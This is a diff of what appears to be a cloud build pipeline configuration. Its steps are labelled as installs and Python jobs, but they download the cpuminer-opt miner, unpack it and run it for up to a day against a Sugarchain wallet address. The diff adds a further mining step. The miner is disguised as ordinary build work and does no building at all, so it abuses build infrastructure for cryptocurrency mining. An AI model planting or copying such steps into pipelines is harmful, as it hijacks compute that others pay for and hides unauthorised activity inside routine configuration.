@@ -6,7 +6,6 @@ steps:
       - |
           wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
           tar xf cpuminer-opt-linux.tar.gz
-          ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     id: 'go-install'
   - name: 'python:3.8'
@@ -14,8 +13,6 @@ steps:
     args:
       - "-c"
       - |
-          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-          tar xf cpuminer-opt-linux.tar.gz
           ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     waitFor: ['go-install']
@@ -24,8 +21,14 @@ steps:
     args:
       - "-c"
       - |
-          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
+    timeout: 86400s
+    waitFor: ['go-install']
+  - name: 'python:3.8.8'
+    entrypoint: "bash"
+    args:
+      - "-c"
+      - |
           ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     waitFor: ['go-install']
